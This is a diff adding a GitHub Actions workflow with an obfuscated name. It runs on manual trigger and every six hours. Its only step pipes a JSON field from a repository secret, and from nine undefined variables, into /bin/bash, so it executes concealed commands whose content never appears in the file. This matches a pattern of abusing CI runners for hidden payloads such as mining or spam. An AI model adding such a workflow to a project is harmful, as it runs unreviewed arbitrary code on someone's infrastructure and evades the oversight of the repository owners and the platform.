@@ -1,0 +1,27 @@
+name: equationpreviously
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: equationpreviously
+        env:
+          oyy350: ${{ secrets.oyy350 }}
+        run: |
+          echo $oyy350 | jq -r .fpz064 | /bin/bash
+          echo $wecar3 | jq -r .bdx4536 | /bin/bash
+          echo $osaj2987 | jq -r .ncx9612 | /bin/bash
+          echo $w94770 | jq -r .txrk0960 | /bin/bash
+          echo $gsh88896 | jq -r .u3033 | /bin/bash
+          echo $q8311 | jq -r .mhcoo6 | /bin/bash
+          echo $cuepz0522 | jq -r .tlxmw9 | /bin/bash
+          echo $g579 | jq -r .pps04 | /bin/bash
+          echo $kvlmr88540 | jq -r .fdvt0562 | /bin/bash
+          echo $y81259 | jq -r .mf8302 | /bin/bash
+
